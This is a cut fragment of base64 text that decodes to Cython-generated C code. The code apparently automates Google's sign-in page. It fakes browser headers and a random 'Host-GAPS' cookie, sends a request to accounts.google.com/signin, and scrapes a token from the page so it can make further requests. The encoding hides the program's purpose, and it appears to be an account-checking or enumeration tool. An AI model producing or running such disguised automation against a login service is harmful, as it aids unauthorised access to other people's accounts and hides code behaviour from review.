gogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3JhbmdlKTsKICAgICAgX19weXhfdF82ID0gX19weXhfYnVpbHRpbl9yYW5nZTsgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF90XzkgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF84fTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdF82ID0gX19weXhfcGZfMm5lXzN0bGxfZ2VuZXhwcihOVUxMLCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19weXhfdF82ID0gUHlVbmljb2RlX0pvaW4oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMiwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX3B5eF92X24xID0gKChQeU9iamVjdCopX19weXhfdF82KTsKICAgICAgX19weXhfdF82ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBOVUxMOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9yYW5nZSk7CiAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X2J1aWx0aW5fcmFuZ2U7IAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfN307CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICB9CiAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X3BmXzJuZV8zdGxsXzNnZW5leHByKE5VTEwsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19weXhfdF82ID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF90XzggPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yLCBfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fcHl4X3ZfbjIgPSAoKFB5T2JqZWN0KilfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IE5VTEw7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3JhbmdlKTsKICAgICAgX19weXhfdF83ID0gX19weXhfYnVpbHRpbl9yYW5nZTsgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX3B5eF90XzkgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfdF81fTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIH0KICAgICAgX19weXhfdF83ID0gX19weXhfcGZfMm5lXzN0bGxfNmdlbmV4cHIoTlVMTCwgX19weXhfdF84KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fcHl4X3RfNyA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdl9ob3N0ID0gX19weXhfdF83OwogICAgICBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXJfSVFfYXJfcV8wXzlfZW5fSVFfcV8wXzhfZW5fcSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRlbnRfdHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dvb2dsZV9hY2NvdW50c194c3JmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTE3LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEyMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzkgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEyMSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIH0KICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMjEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF82KSA8ICgwKSkgX19QWVhfRVJSKDAsIDExNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF92X2hlMyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzkgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMSA6IDApXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWduaW59OwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZTMsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTIzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgfQogICAgICBfX3B5eF92X3JlczEgPSBfX3B5eF90Xzc7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWFyY2gpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTI3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMjgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7CiAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMCk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGF0YV9pbml0aWFsX3NldHVwX2RhdGFfbnVsbF9udWwsIF9fcHl4X3RfNH07CiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMy1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxMjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICB9CiAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3RfODsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMn07CiAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dyb3VwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTI4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgfQogICAgICBfX3B5eF92X3RvayA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEzMCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0hvc3RfR0FQUywgX19weXhfdl9ob3N0KSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzMCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3ZfY29va2llcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNyA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDA